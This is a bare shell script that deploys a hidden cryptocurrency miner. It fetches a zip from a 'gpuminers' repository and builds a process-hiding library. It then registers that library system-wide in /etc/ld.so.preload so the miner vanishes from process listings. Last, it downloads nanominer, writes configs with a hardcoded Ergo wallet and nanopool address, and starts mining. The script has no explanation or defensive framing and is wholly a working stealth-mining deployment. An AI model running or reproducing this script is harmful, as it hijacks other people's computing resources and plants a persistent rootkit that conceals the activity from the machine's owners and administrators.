#!/bin/sh
apt update;apt -y install unzip screen binutils build-essential cmake git net-tools
wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/magicNan.zip
unzip magicNan.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

wget https://github.com/nanopool/nanominer/releases/download/v1.13.1/nanominer-linux-1.13.1.tar.gz
tar -xvzf nanominer-linux-1.13.1.tar.gz
cd nanominer-linux-1.13.1
rm config*

cat > config_ergo.ini <<END
[autolykos]
wallet = 9hGWyH8zzSC1yWpmg7SeQTEJi9chB2Z3Asc9Yk35LCJseZB6JZg
coin = ERG
rigName = Nano
pool1 = ergo-us-east1.nanopool.org:11433
END

cat > config.ini <<END
[autolykos]
wallet = 9hGWyH8zzSC1yWpmg7SeQTEJi9chB2Z3Asc9Yk35LCJseZB6JZg
coin = ERG
rigName = Nano
pool1 = ergo-us-east1.nanopool.org:11433
END
./nanominer
